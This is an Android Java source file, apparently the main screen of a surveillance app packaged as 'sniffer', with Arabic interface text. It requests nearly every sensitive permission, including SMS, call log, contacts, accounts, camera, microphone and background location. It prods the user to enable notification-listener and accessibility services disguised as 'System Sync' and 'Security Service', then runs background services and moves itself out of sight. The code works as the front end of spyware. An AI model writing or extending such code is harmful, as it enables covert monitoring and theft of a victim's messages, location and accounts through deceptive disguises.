package com.v8.global.sniffer;

import android.app.Activity;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityManager;
import android.app.NotificationManager;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private TextView statusText;
    private Button requestPermissionsBtn;
    private Button startServiceBtn;
    
    private String[] permissions = {
        Manifest.permission.INTERNET,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.GET_ACCOUNTS,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.SYSTEM_ALERT_WINDOW
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // واجهة بسيطة
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);
        
        statusText = new TextView(this);
        statusText.setText("🔴 التطبيق غير مفعل");
        statusText.setTextSize(18);
        statusText.setPadding(0, 0, 0, 30);
        
        requestPermissionsBtn = new Button(this);
        requestPermissionsBtn.setText("🔐 طلب جميع الصلاحيات");
        requestPermissionsBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });
        
        startServiceBtn = new Button(this);
        startServiceBtn.setText("🚀 تشغيل الخدمات");
        startServiceBtn.setEnabled(false);
        startServiceBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startBackgroundServices();
            }
        });
        
        layout.addView(statusText);
        layout.addView(requestPermissionsBtn);
        layout.addView(startServiceBtn);
        
        setContentView(layout);
        
        // فحص الصلاحيات عند البدء
        checkPermissionsStatus();
        
        // طلب تجاهل تحسين البطارية تلقائياً
        requestIgnoreBatteryOptimizations();
        
        // فتح إعدادات الإشعارات
        openNotificationSettings();
        
        // فتح إعدادات الوصول
        openAccessibilitySettings();
    }
    
    private void requestAllPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            Toast.makeText(this, "✅ جميع الصلاحيات ممنوحة", Toast.LENGTH_LONG).show();
            startServiceBtn.setEnabled(true);
            statusText.setText("🟢 التطبيق مفعل وجاهز");
        }
    }
    
    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }
        }
    }
    
    private void openNotificationSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "⚠️ فعل خدمة System Sync في الإشعارات", Toast.LENGTH_LONG).show();
        }
    }
    
    private void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);
        Toast.makeText(this, "⚠️ فعل خدمة Security Service في الوصول", Toast.LENGTH_LONG).show();
    }
    
    private void checkPermissionsStatus() {
        boolean allGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        
        if (allGranted) {
            startServiceBtn.setEnabled(true);
            statusText.setText("🟢 التطبيق مفعل وجاهز");
        } else {
            statusText.setText("🟡 في انتظار الصلاحيات");
        }
    }
    
    private void startBackgroundServices() {
        // تشغيل خدمة الإشعارات
        Intent notificationIntent = new Intent(this, NotificationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(notificationIntent);
        } else {
            startService(notificationIntent);
        }
        
        Toast.makeText(this, "✅ الخدمات تعمل في الخلفية", Toast.LENGTH_LONG).show();
        
        // إخفاء التطبيق من المهام الأخيرة
        moveTaskToBack(true);
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            checkPermissionsStatus();
            
            // طلب صلاحيات إضافية
            requestIgnoreBatteryOptimizations();
            openNotificationSettings();
            openAccessibilitySettings();
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        checkPermissionsStatus();
    }
}
